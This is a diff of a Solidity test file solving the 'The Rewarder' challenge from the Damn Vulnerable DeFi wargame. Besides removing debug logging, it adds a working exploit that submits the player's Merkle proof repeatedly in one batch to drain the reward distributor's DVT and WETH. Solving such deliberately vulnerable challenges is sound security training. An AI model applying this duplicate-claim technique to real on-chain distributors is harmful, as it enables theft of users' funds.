@@ -14,7 +14,7 @@ contract TheRewarderChallenge is Test {
     address alice = makeAddr("alice");
     address recovery = makeAddr("recovery");
 
-    uint256 constant BENEFICIARIES_AMOUNT = 5;//1000;
+    uint256 constant BENEFICIARIES_AMOUNT = 1000;
     uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
     uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;
 
@@ -48,9 +48,6 @@ contract TheRewarderChallenge is Test {
     function setUp() public {
         startHoax(deployer);
 
-        console.log(player);
-        console.log(alice);
-
         // Deploy tokens to be distributed
         dvt = new DamnValuableToken();
         weth = new WETH();
@@ -61,9 +58,7 @@ contract TheRewarderChallenge is Test {
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         merkle = new Merkle();
         dvtRoot = merkle.getRoot(dvtLeaves);
-        console.logBytes32(dvtRoot);
         wethRoot = merkle.getRoot(wethLeaves);
-        console.logBytes32(wethRoot);
 
         // Deploy distributor
         distributor = new TheRewarderDistributor();
@@ -93,10 +88,6 @@ contract TheRewarderChallenge is Test {
 
         // Create Alice's claims
         Claim[] memory claims = new Claim[](2);
-        console.log("\n\n");
-        console.logBytes32(merkle.getProof(dvtLeaves, 2)[0]);
-        console.logBytes32(merkle.getProof(dvtLeaves, 2)[1]);
-        console.logBytes32(merkle.getProof(dvtLeaves, 2)[2]);
 
         // First, the DVT claim
         claims[0] = Claim({
@@ -105,10 +96,6 @@ contract TheRewarderChallenge is Test {
             tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
             proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
         });
-
-        console.logBytes32(merkle.getProof(wethLeaves, 2)[0]);
-        console.logBytes32(merkle.getProof(wethLeaves, 2)[1]);
-        console.logBytes32(merkle.getProof(wethLeaves, 2)[2]);
 
         // And then, the WETH claim
         claims[1] = Claim({
@@ -161,7 +148,45 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+        uint256 dvtPlayerReward = 11524763827831882;
+        uint256 wethPlayerReward = 1171088749244340;
+        uint256 dvtAttackCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtPlayerReward;
+        uint256 wethAttackCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethPlayerReward;
+
+        Claim[] memory claims = new Claim[](dvtAttackCount + wethAttackCount);
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+        for (uint256 i = 0; i < dvtAttackCount; i++) {
+            claims[i] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: dvtPlayerReward,
+            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+            proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
+            });
+        }
+        for (uint256 i = 0; i < wethAttackCount; i++) {
+            claims[dvtAttackCount + i] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: wethPlayerReward,
+            tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+            proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
+            });
+        }
+
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -194,9 +219,6 @@ contract TheRewarderChallenge is Test {
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
         Reward[] memory rewards =
             abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
-        bytes memory ret = vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path)));
-        console.logBytes(ret);
-        console.log("\n\n\n\n");
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
@@ -205,4 +227,3 @@ contract TheRewarderChallenge is Test {
         }
     }
 }
-
